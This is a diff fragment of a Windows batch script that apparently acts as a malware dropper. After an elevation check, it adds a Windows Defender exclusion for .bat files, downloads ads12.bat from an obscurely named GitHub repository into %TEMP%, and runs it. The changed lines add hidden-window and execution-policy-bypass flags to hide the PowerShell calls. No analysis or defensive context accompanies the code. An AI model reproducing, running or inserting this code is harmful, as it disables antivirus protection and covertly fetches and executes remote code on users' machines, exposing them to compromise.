@@ -26,7 +26,7 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
-Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+Powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-MpPreference -ExclusionExtension bat"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/ads12.bat' -OutFile ads12.bat"
+Powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/ads12.bat' -OutFile ads12.bat"
 ads12.bat
